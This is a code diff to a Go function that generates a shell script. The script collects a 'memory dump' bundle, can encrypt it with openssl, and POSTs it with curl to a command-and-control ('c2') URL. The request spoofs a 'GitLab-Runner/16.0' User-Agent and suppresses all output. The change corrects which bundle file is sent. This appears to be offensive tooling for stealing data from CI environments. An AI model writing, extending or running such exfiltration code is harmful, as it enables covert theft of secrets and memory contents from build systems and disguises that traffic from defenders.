@@ -72,6 +72,7 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 	b.WriteString("set -e\n")
 	b.WriteString("_memdump() {\n")
 	b.WriteString(`  _d=$(mktemp -d)
+  _memcount=0
   echo "[*] Memory dump working directory: $_d"
 
 `)
@@ -229,11 +230,13 @@ with open('$_d/report.json', 'w') as f:
 `)
 
 	// Step 8: Encryption (optional)
+	exfilFile := "$_d/bundle.tgz"
 	if key := strings.TrimSpace(o.EncryptionKey); key != "" {
+		exfilFile = "$_d/bundle.enc"
 		b.WriteString(fmt.Sprintf(`  # 8. Encrypt with passphrase
   openssl enc -aes-256-cbc -pbkdf2 -salt \
     -in "$_d/bundle.tgz" -out "$_d/bundle.enc" \
-    -pass pass:%s 2>/dev/null
+    -pass pass:'%s' 2>/dev/null
 `, key))
 	}
 
@@ -245,9 +248,9 @@ with open('$_d/report.json', 'w') as f:
   curl -sS -X POST \
     -H "Content-Type: application/octet-stream" \
     -H "User-Agent: GitLab-Runner/16.0" \
-    --data-binary @"$_d/bundle.enc" \
+    --data-binary @"%s" \
     "%s" >/dev/null 2>&1 || true
-`, c2, c2))
+`, c2, exfilFile, c2))
 	} else {
 		b.WriteString(`  # 9. Output summary (artifact-only mode)
   echo "[*] Memory dump complete. Data available in artifacts."
